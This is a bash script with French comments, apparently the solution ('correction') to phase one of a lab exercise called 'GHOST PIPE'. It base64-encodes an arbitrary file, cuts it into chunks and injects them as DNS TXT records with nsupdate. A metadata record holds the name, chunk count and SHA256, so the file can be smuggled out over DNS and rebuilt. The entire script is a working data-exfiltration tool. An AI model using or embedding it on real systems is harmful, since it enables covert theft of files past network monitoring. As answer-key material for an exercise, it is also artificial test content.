#!/bin/bash
# ==========================================================================
#  GHOST PIPE — Phase 1 : Injection DNS (CORRECTION)
#  Usage : ./phase1-inject.sh <fichier> [sous-domaine] [serveur-dns]
# ==========================================================================

set -euo pipefail

# ── Paramètres ──────────────────────────────────────────────────────────────
FILE="${1:?Usage: $0 <fichier> [sous-domaine] [serveur-dns]}"
SUBDOMAIN="${2:-exfil}"
DNS_SERVER="${3:-172.20.0.53}"
ZONE="corp.local"
CHUNK_SIZE=250          # Taille max d'un chunk base64 par TXT record
TTL=3600

# ── Vérifications ───────────────────────────────────────────────────────────
if [ ! -f "$FILE" ]; then
    echo "[!] Fichier introuvable : $FILE"
    exit 1
fi

FILENAME=$(basename "$FILE")
FILESIZE=$(stat -c%s "$FILE")
echo "══════════════════════════════════════════════════"
echo "  GHOST PIPE — Injection DNS TXT"
echo "══════════════════════════════════════════════════"
echo "[*] Fichier       : $FILENAME ($FILESIZE octets)"
echo "[*] Serveur DNS   : $DNS_SERVER"
echo "[*] Zone          : $ZONE"
echo "[*] Sous-domaine  : $SUBDOMAIN"

# ── Étape 1 : Encodage Base64 ──────────────────────────────────────────────
echo ""
echo "[1/4] Encodage en base64..."
B64_DATA=$(base64 -w 0 "$FILE")
B64_SIZE=${#B64_DATA}
echo "      Taille base64 : $B64_SIZE caractères"

# ── Étape 2 : Calcul du hash d'intégrité ───────────────────────────────────
echo "[2/4] Calcul du hash SHA256..."
HASH=$(sha256sum "$FILE" | awk '{print $1}')
echo "      SHA256 : $HASH"

# ── Étape 3 : Découpage en chunks ──────────────────────────────────────────
echo "[3/4] Découpage en chunks de $CHUNK_SIZE caractères..."
NB_CHUNKS=$(( (B64_SIZE + CHUNK_SIZE - 1) / CHUNK_SIZE ))
echo "      Nombre de chunks : $NB_CHUNKS"

# ── Étape 4 : Injection via nsupdate ───────────────────────────────────────
echo "[4/4] Injection dans le DNS via nsupdate..."
echo ""

# Record de métadonnées (index 000)
# Format : filename|nb_chunks|sha256|taille_originale
META="${FILENAME}|${NB_CHUNKS}|${HASH}|${FILESIZE}"

# Construction du batch nsupdate
NSUPDATE_BATCH=$(mktemp)
cat > "$NSUPDATE_BATCH" << EOF
server $DNS_SERVER
zone $ZONE
EOF

# Ajout du record de métadonnées
echo "update add chunk-000.${SUBDOMAIN}.${ZONE}. $TTL TXT \"${META}\"" >> "$NSUPDATE_BATCH"
echo "      [000/$NB_CHUNKS] Métadonnées injectées"

# Ajout des chunks de données
for (( i=0; i<NB_CHUNKS; i++ )); do
    OFFSET=$(( i * CHUNK_SIZE ))
    CHUNK="${B64_DATA:$OFFSET:$CHUNK_SIZE}"
    CHUNK_NUM=$(printf "%03d" $((i + 1)))

    echo "update add chunk-${CHUNK_NUM}.${SUBDOMAIN}.${ZONE}. $TTL TXT \"${CHUNK}\"" >> "$NSUPDATE_BATCH"
    echo -ne "      [$CHUNK_NUM/$NB_CHUNKS] Chunk injecté\r"
done

echo ""
echo "send" >> "$NSUPDATE_BATCH"

# Exécution du nsupdate
nsupdate "$NSUPDATE_BATCH" 2>&1
RESULT=$?

rm -f "$NSUPDATE_BATCH"

if [ $RESULT -eq 0 ]; then
    echo ""
    echo "══════════════════════════════════════════════════"
    echo "  ✅ INJECTION TERMINÉE"
    echo "══════════════════════════════════════════════════"
    echo "  Fichier    : $FILENAME"
    echo "  Records    : $((NB_CHUNKS + 1)) TXT (1 meta + $NB_CHUNKS data)"
    echo "  Domaine    : chunk-XXX.${SUBDOMAIN}.${ZONE}"
    echo "  SHA256     : $HASH"
    echo ""
    echo "  Vérification rapide :"
    echo "    dig TXT chunk-000.${SUBDOMAIN}.${ZONE} @${DNS_SERVER}"
    echo "══════════════════════════════════════════════════"
else
    echo "[!] Erreur lors de l'injection nsupdate (code $RESULT)"
    exit 1
fi
